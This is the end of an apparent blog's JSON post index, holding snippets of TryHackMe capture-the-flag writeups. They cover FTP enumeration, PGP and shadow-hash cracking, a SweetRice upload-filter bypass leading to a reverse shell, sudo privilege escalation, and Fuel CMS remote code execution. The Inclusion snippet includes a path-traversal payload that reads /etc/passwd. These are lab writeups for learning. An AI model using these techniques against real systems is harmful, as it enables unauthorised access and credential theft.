    "snippet": "Anonforce is an easy room on TryHackMe created to test password cracking skills.ReconStarting with a nmap scan, I see that there are two ports open which are FTP and SSH.A more aggressive port scan reveals that that the FTP service has anonymous login enabled.Not only that but it seems I have access to the root directory machine although not root privileges. Looking into the home directory, there is the user “melodias” and in his home directory is the user.txt file.After a little time looking around, I noticed that there is the directory notread in the root directory. I downloaded the files private.asc which seems to be a private pgp key and backup.pgp which is an encrypted message presumably by the pgp key.Exploitation - Weak PasswordsAfter downloading the files, I get ready to import and decrypt the PGP message only to find out that the private key is password protected. Using gpg2john, I created a recognizable password hash for JohnTheRipper to crack. The wordlist I used was the 10k-most-common.txt which cracked the password in less than a minute.The contents of backup.pgp is what seemed to be the shadow file which contains all the password hashes of users in a Linux machine. For this scenario, I used unshadow and just like the last one, I used it to generate a recognizable hash for JohnTheRipper. The passwd file is also required to use unshadow, but that can be obtained using FTP.Whichever wordlist you choose makes a whole lot of difference. In my first cracking attempt, I used  the default wordlist for JTR which led to my computer running for an entire hour. Afterwards, I stopped the process because I thought this amount of time for password cracking was unusual for an easy level room. So I switched wordlists and using 10-million-password-list-top-1000000.txt from SecLists, I cracked the password in less than 20 seconds. After discovering the password, I logged in through SSH and read the root.txt file."
  },
  
  {
    "title": "TryHackMe Lazy Admin Walkthrough",
    "url": "/posts/THM-Lazy-Admin-Walkthrough/",
    "categories": "Writeups",
    "tags": "Linux, Vulnerabilities, TryHackMe, CTF",
    "date": "2022-01-07 00:00:00 +0800",
    





    "snippet": "Lazy Admin is a an easy CTF room on TryHackMe that will test one’s enumeration and linux skills.ReconAfter deploying the machine, I did a mandatory nmap scan to see what ports are open and what network services are being used.Here we see that there are 2 network services running on the machine. With a Firefox browser, I visited the website on port 80. Once on the site, I am greeted with the Apache2 Default Page. There’s nothing else to do here, so I went back to doing more enumeration and information gathering.Using Ffuf, I looked for what other directories are available on the website.I then discovered the directory “content” and visited it.Here I see that it’s another default page that’s under construction. However there is something interesting. “SweetRice” is what’s being used to manage the content on the site. Using this information, we can search for any available vulnerabilities that we can use on the site.On the site Exploit-DB I discover that there are a number of vulnerabilities that I can use. I looked at the most severe vulnerability that would allow PHP Code Execution, but I tested it and it didn’t seemed to have worked. The vulnerabilities that allow Arbitrary File Uploading and Downloading would only work with valid credentials to the CMS. So there’s only one vulnerability left, that being Backup Disclosure.The exploit report stated that a mysql backup file can be accessed on the site in the directory /inc/mysql_backup. A vulnerability like this can lead to gaining access to the CMS and being able to use the file upload and download vulnerabilities. So with that I took a look at the URI http://thm_host.thm/content/inc/mysql_backup and I discover there to be a MySQL backup file. Seeing it, I downloaded it and took a look at it’s contents.Analyzing the file, I see that there is the username “manager” with what looks to be a hashed password.ExploitationUsing CrackStation, a popular password hash cracking site, I entered the hash and discovered what the password was.Now I just needed to use the credentials on a login. Looking back at the vulnerability reports on arbitrary file uploading and downloading, there was the directory “as”. At the same time, my Ffuf enumeration picked up on it.It wasn’t necessary to enumerate the site again, but it’s always good to keep some sort of scan running in the background.After checking the credentials to be valid, we can then leverage the Arbitrary File Upload vulnerability to achieve a reverse shell connection. There are two ways we can do it. One is to login to the site, upload the shell and view it on a browser to execute it, or use the python script on exploit-db. I did the former.Once I attempted to upload a shell onto the site, I saw that my uploads weren’t appearing on the site. After a moment, I realized there was likely some sort of filter being used on the files being uploaded to the site. So I changed the file extension of my file from “shell.php” to “shell.php5”. After uploading the file, I saw it, executed the file, and achieved a reverse shell connection.First thing I did was list all the users in the home directory and then list all the contents of the user itguy’s files and directories. I then read the user.txt file.Privilege EscalationNow that I’ve managed to connect to the machine, I then proceeded to escalate my privileges to root.Other than user.txt, I noticed that there is the file backup.pl which is a script written in the perl programming language.I checked crontab to see if it is set to execute by root every so often but that was not the case. So I then checked if there are any sudo privileges www-data had and as we can see, we can execute the script using sudo without a password.Although the script backup.pl itself isn’t writable, it executes commands in the file copy.sh located in /etc/ which is a writable file. By overwriting copy.sh, we can execute commands using root privilegesAt this point, I could either create another reverse shell that would be in root or just execute a command that would read the root.txt file. I did the latter."
  },
  
  {
    "title": "TryHackMe Vulnerability Capstone Writeup",
    "url": "/posts/THM-Vulnerability-Capstone/",
    "categories": "Writeups",
    "tags": "Vulnerabilities, CTF, TryHackMe",
    "date": "2021-12-27 00:00:00 +0800",
    





    "snippet": "The THM room Vulnerability Capstone is a CTF room built to practice your vulnerability and exploit researching skills.ReconOnce the machine has started, we do a quick mandatory nmap scan to see what network services are running on the machine.Here we see that there are two ports open, SSH and HTTP. Using a browser, we then take a look at the website.Immediately we are greeted by the default page of FUEL, a CMS software. The bottom version is also displayed to be 1.4. Both of which are the answers to questions 1 and 2 on task 2.The next question then asks what is the CVE ID that allows an attacker to remotely execute code on the web application. Here we can do two things, which is go straight to Google and search with the query “Fuel CMS 1.4 exploits” or search a vulnerability database such as Exploit-DB.On this webpage we see there are 3 exploits specifically that will allow RCE. Visiting any of the links will lead to the exploit code and the CVE ID which is CVE-2018-16763, the answer to question 3 on task 2.ExploitationNext is what I thought to be challenging as it took more time that I thought it should.Viewing each of the exploits, we see that they are each built slightly differently with one being made in python2, another in ruby, and the last in python3. I chose the python3 script by Padsala Trushal because I am familiar with the langauge and it was up to date.However to my surprise, the exploit didn’t work and just returns “system” whenever I attempted to execute a command. I then tried the other two exploits on the list but both of them also didn’t work.I looked back in the questions on the page and I reread the note that said “There are numerous exploits out there that can be used for this vulnerability (some more useful than others!)”. The way I interpretted this was that there are many exploits but not all of them would work. So we’re back into recon.From what I know, Github is a very well known site for programmers but it is also used by security engineers. Sometimes people would create their own custom exploits for CVEs making Github useful to search for exploits sometimes. Using the query “site:github.com CVE-2018-16763 exploit” on a search engine, I then went through pages of github repositories looking for an exploit that worked. The first one looked promising but I was disappointed as I couldn’t read the flag file.After a long while, I finally found an exploit that worked which was a bash script made by k4is3r13. Using it, we can then either create a reverse shell, or just read the flag file off /home/ubuntu/.Although I strugged a little bit finding an exploit that worked, it was satisfying to have finally found one with all that work. Overall this is a great room to practicing vulnerability and exploit researching skills."
  },
  
  {
    "title": "TryHackMe Inclusion Writeup",
    "url": "/posts/THM-Inclusion/",
    "categories": "Writeups",
    "tags": "TryHackMe, CTF, Web-Attacks",
    "date": "2021-12-23 00:00:00 +0800",
    





    "snippet": "The TryHackMe inclusion room is a beginner CTF room created to practice exploiting a local file inclusion (LFI) vulnerability in a web server. Once you have booted up the machine, let’s get started with a simple nmap scan.EnumerationWith a nmap scan, we can see that we have two ports that are open.Using your HTTP proxy software of choice (I use OWASP ZAP) we then visit the website.Looking around the website and clicking any of the “View details” links, we are displayed different text all of which are requested using the name= parameter in the URL. We can assume that this parameter is vulnerable to LFI. To test it, we can input the text ../../../../../etc/passwd into the parameter which makes a request to show the passwd file in the Linux machine.Here we see confirm that name= is in fact vulnerable to LFI and we see the user falconfeast and credentials.ExploitFrom here, there are two ways to read the user.txt and root.txt files. One is to use the credentials in the passwd file to login with SSH, escalate privileges and read the files or to just leverage the LFI vulnerability and read the files. I did the latter as I tested a guess to where the user.txt file is and I discovered that root.txt was also readable."
  }
  
]

